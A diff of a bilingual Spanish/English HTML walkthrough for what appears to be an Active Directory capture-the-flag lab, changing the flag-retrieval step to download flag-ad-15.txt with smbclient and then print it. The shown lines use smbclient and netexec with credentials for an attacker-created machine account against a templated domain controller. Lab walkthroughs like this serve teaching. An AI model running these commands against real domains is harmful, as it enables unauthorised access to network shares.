@@ -43,7 +43,8 @@ nxc smb {{ ad_dc_ip }} -u 'evilpc$' -p 'Evil1234!' --shares</pre>
 
     <h3>4 · Capturar la flag</h3>
     <p>El recurso <code>computers</code> es legible por <code>Domain Computers</code>, grupo del que tu nueva máquina es miembro automáticamente:</p>
-    <pre>smbclient //{{ ad_dc_ip }}/computers -U '{{ ad_domain }}\evilpc$%Evil1234!' -c 'get flag-ad-15.txt -'
+    <pre>smbclient //{{ ad_dc_ip }}/computers -U '{{ ad_domain }}\evilpc$%Evil1234!' -c 'get flag-ad-15.txt'
+cat flag-ad-15.txt
 
 # o con netexec
 nxc smb {{ ad_dc_ip }} -u 'evilpc$' -p 'Evil1234!' \
@@ -93,7 +94,8 @@ nxc smb {{ ad_dc_ip }} -u 'evilpc$' -p 'Evil1234!' --shares</pre>
 
     <h3>4 · Capture the flag</h3>
     <p>The <code>computers</code> share is readable by <code>Domain Computers</code>, a group your new machine automatically belongs to:</p>
-    <pre>smbclient //{{ ad_dc_ip }}/computers -U '{{ ad_domain }}\evilpc$%Evil1234!' -c 'get flag-ad-15.txt -'
+    <pre>smbclient //{{ ad_dc_ip }}/computers -U '{{ ad_domain }}\evilpc$%Evil1234!' -c 'get flag-ad-15.txt'
+cat flag-ad-15.txt
 
 # or with netexec
 nxc smb {{ ad_dc_ip }} -u 'evilpc$' -p 'Evil1234!' \
